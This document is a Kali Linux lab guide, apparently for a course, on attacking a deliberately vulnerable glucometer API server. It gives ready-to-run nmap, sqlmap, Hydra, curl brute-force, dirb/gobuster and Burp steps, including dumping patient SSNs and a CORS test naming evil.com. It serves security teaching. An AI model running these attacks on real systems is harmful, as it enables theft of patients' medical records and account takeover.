# Kali Linux Attack Guide

## Prerequisites

1. Glucometer vulnerable server running on target machine
2. Know the target IP (or `localhost` if running locally)
3. Kali Linux with standard tools

## Server Setup

On the target machine (Mac/Windows/Linux):

```bash
cd vulnerable-server
python3 -m venv venv
source venv/bin/activate  # or venv\Scripts\activate on Windows
pip install -r requirements.txt
python3 app.py
```

Server runs on port 8080.

---

## Attack 1: Port Scanning with Nmap

**Goal**: Discover open ports and services

```bash
# Basic scan
nmap -p 8080 <target-ip>

# Service version detection
nmap -sV -p 8080 <target-ip>

# Full scan
nmap -A -p 8080 <target-ip>
```

**Expected Finding**: Port 8080 open, Python/uvicorn web server

---

## Attack 2: SQL Injection with SQLmap

**Goal**: Extract data from database

```bash
# Test for SQL injection
sqlmap -u "http://<target-ip>:8080/api/readings?patient_id=1" --batch

# Enumerate databases
sqlmap -u "http://<target-ip>:8080/api/readings?patient_id=1" --dbs --batch

# Dump all tables
sqlmap -u "http://<target-ip>:8080/api/readings?patient_id=1" --dump-all --batch

# Target specific table (patients with PII)
sqlmap -u "http://<target-ip>:8080/api/readings?patient_id=1" -D main -T patients --dump --batch
```

**Expected Finding**: SQLite database, can extract patient SSNs

---

## Attack 3: Brute Force with Hydra

**Goal**: Crack login credentials

```bash
# Using rockyou wordlist
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  <target-ip> -s 8080 http-post-form \
  "/api/login:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:Invalid"
```

**Note**: The JSON format might need adjusting. Alternative with curl loop:

```bash
for pass in $(cat /usr/share/wordlists/rockyou.txt | head -100); do
  result=$(curl -s -X POST http://<target-ip>:8080/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$pass\"}")
  if echo "$result" | grep -q "access_token"; then
    echo "[FOUND] Password: $pass"
    break
  fi
done
```

**Expected Finding**: Password is `password123`

---

## Attack 4: API Testing with Burp Suite

**Goal**: Intercept and modify API requests

1. Start Burp Suite
2. Configure browser to use Burp proxy (127.0.0.1:8080)
3. Navigate to `http://<target-ip>:8080/`
4. In Proxy > HTTP History, observe requests
5. Send requests to Repeater for modification

**Tests to perform**:
- Modify JWT token claims
- Change patient_id to SQL injection payload
- Remove X-API-Key header
- Modify glucose values to impossible numbers

---

## Attack 5: Directory/Endpoint Discovery

**Goal**: Find hidden endpoints

```bash
# Using dirb
dirb http://<target-ip>:8080/ /usr/share/wordlists/dirb/common.txt

# Using gobuster
gobuster dir -u http://<target-ip>:8080/ -w /usr/share/wordlists/dirb/common.txt

# Manual curl check
curl http://<target-ip>:8080/api/debug
```

**Expected Finding**: `/api/debug` endpoint leaks sensitive info

---

## Attack 6: CORS Misconfiguration Test

**Goal**: Verify cross-origin attack possibility

```bash
curl -H "Origin: http://evil.com" \
  -H "Access-Control-Request-Method: GET" \
  -X OPTIONS http://<target-ip>:8080/api/readings -v
```

**Expected Finding**: Server returns `Access-Control-Allow-Origin: *`

---

## Documenting Results

After each attack:

1. Take screenshots of terminal output
2. Save any extracted data
3. Fill out `attack-report-template.md`
4. Note which defenses would have blocked the attack

---

## Safety Reminders

- Only attack the lab server, never real systems
- This is for educational purposes only
- Document everything for your report
